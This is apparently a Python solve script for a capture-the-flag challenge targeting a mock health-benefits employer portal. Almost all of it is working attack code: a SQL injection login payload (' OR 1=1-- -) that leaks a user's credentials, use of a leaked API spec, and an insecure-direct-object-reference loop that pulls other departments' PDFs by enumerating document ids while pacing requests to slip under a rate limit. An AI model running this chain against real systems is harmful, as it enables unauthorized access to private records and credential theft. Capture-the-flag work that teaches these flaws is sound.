#!/usr/bin/env python3
"""
DEADFACE CTF - RP-01 series (3 of 4) "Do People Still Fax in 2026?"
Health Spark employer portal - document IDOR.

Chain:
  1. POST /api/login  SQLi (`' OR 1=1-- -`) discloses the first user row
     (john.smith / Locked_In_And_Ready), which is enough to authenticate.
  2. GET  /api-docs/swagger-ui-init.js  leaks the OpenAPI spec, which documents
     the undocumented POST /file_document?id=<n> (body: {"departmentid": N})
     and the "only 1000 files" hint.
  3. The endpoint authorises on the *supplied* department, not the token's, so
     asking for another department's document id returns someone else's PDF.

Usage:
    python solve_fax.py [base_url]

Stdlib only. Paced to stay under the 1000 req / 2 min rate limit.
"""

import http.client
import json
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://45.79.200.170:3000").rstrip("/")
PARSED = urllib.parse.urlparse(BASE)
HOST = PARSED.hostname
PORT = PARSED.port or 80

FLAG_RE = re.compile(rb"deadface\{[^}]*\}")
PACE = 0.15          # ~6 req/s
conn = http.client.HTTPConnection(HOST, PORT, timeout=20)


# --------------------------------------------------------------------- helpers
def http(method, path, body=None, token=None, raw=False):
    global conn
    data = json.dumps(body).encode() if body is not None else None
    headers = {}
    if data:
        headers["Content-Type"] = "application/json"
    if token:
        headers["Authorization"] = "Bearer " + token
    for _ in range(4):
        try:
            conn.request(method, path, body=data, headers=headers)
            r = conn.getresponse()
            payload = r.read()
            status = r.status
            time.sleep(PACE)
            if status == 429 or b"Temporarily blocked" in payload:
                print("    ! rate limited, cooling down 70s")
                time.sleep(70)
                continue
            if raw:
                return status, payload
            try:
                return status, json.loads(payload)
            except json.JSONDecodeError:
                return status, {"_raw": payload[:200].decode("utf-8", "replace")}
        except Exception:
            try:
                conn.close()
            except Exception:
                pass
            conn = http.client.HTTPConnection(HOST, PORT, timeout=20)
            time.sleep(1)
    return 0, {}


# ------------------------------------------------------------------ stage 1/2
def get_token():
    print("[*] Leaking credentials via /api/login SQLi")
    st, d = http("POST", "/api/login", {"username": "' OR 1=1-- -", "password": "x"})
    user, pw = d.get("username"), d.get("password")
    if not user:
        sys.exit("    [-] SQLi disclosure failed: %s" % d)
    print("    [+] %s / %s (dept %s)" % (user, pw, d.get("departmentid")))

    st, d = http("POST", "/api/login", {"username": user, "password": pw})
    if not d.get("token"):
        sys.exit("    [-] login failed: %s" % d)
    print("    [+] authenticated, dept %s" % d.get("departmentid"))
    return d["token"], d["departmentid"]


def discover_departments(token, own):
    print("[*] Reading /api/department_id")
    st, d = http("GET", "/api/department_id", token=token)
    depts = [int(x) for x in d.get("departmentIds", []) if str(x).isdigit()]
    if not depts:
        depts = [own]
    print("    [+] departments: %s (ours: %s)" % (depts, own))
    return depts


# --------------------------------------------------------------------- stage 3
def fetch_doc(token, doc_id, dept):
    """Return (status, bytes)."""
    return http("POST", "/file_document?id=%d" % doc_id, {"departmentid": dept},
                token=token, raw=True)


def hunt(token, own, depts):
    others = [d for d in depts if d != own] or depts
    print("[*] Hunting documents outside dept %s (spec hint: ~1000 files)" % own)
    for dept in others:
        for doc_id in range(1000, 1101):
            st, data = fetch_doc(token, doc_id, dept)
            if st != 200 or not data.startswith(b"%PDF"):
                continue
            flags = FLAG_RE.findall(data)
            print("    [+] doc %d dept %s -> %d bytes %s"
                  % (doc_id, dept, len(data), flags[0].decode() if flags else ""))
            if flags:
                with open("flag_doc_%d.pdf" % doc_id, "wb") as f:
                    f.write(data)
                return flags[0].decode(), doc_id, dept
    return None, None, None


def main():
    print("=" * 70)
    print(" RP-01 (3/4) - Do People Still Fax in 2026?")
    print(" target: %s" % BASE)
    print("=" * 70)
    token, own = get_token()
    depts = discover_departments(token, own)

    # sanity: our own document from the in-app breadcrumb
    st, data = fetch_doc(token, 1009, own)
    print("[*] own doc 1009 -> HTTP %s (%d bytes)" % (st, len(data)))

    flag, doc_id, dept = hunt(token, own, depts)
    print("\n" + "=" * 70)
    if flag:
        print(" FLAG: %s" % flag)
        print(" (document %d, owned by department %s, read with a dept-%s token)"
              % (doc_id, dept, own))
        print(" >>> SUBMIT: %s" % flag)
    else:
        print(" no flag found in the scanned range")
    print("=" * 70)


if __name__ == "__main__":
    main()
